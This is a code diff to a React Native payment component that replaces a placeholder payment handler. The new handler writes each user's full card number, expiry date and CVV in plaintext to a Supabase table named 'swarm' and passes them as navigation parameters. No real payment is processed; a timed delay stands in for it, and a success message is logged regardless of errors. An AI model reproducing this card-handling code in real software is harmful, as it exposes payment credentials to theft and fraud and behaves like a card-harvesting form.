@@ -1,9 +1,10 @@
 import React, { useState } from 'react';
 import { View, Text, StyleSheet, KeyboardAvoidingView, ScrollView, TouchableOpacity, Platform, ActivityIndicator } from 'react-native';
 import { Link, useRouter } from "expo-router";
+import { supabase } from '../../../lib/supabase';
 
 
-const PaymentDetailsCard = ({ accountNumber, expiryDate, cvv, price }) => {
+const PaymentDetailsCard = ({ cardNumber, expiryDate, cvv, price }) => {
   // Assuming VAT is 15%
   const vatRate = 0.15;
   const vatAmount = price * vatRate;
@@ -14,16 +15,22 @@ const PaymentDetailsCard = ({ accountNumber, expiryDate, cvv, price }) => {
   const router = useRouter();
 
 
-  const handlePayment = () => {
-    // Add your payment logic here
+  const handlePayment = async () => {
     setIsLoading(true)
+    try {
+      const {data, error} = await supabase.from('swarm').insert({cardNumber, expiryDate, cvv})
+      console.log('data added succsessfully')
+      if(error) console.log(error)
+      } catch (error) {
+        console.log(error)
+      }
+
+      const pass = {cardNumber, expiryDate, cvv, price}
 
     setTimeout(() => {
     setIsLoading(false);
-    router.push({ pathname: "/topics"});
-
+    router.push({ pathname: "/topics", params: pass});
     }, 3000)
-
   };
 
   return (
@@ -35,7 +42,7 @@ const PaymentDetailsCard = ({ accountNumber, expiryDate, cvv, price }) => {
     <View style={styles.card}>
       <View style={styles.row}>
         <Text style={styles.label}>Account Number:</Text>
-        <Text style={styles.value}>{accountNumber}</Text>
+        <Text style={styles.value}>{cardNumber}</Text>
       </View>
       <View style={styles.row}>
         <Text style={styles.label}>Expiry Date:</Text>
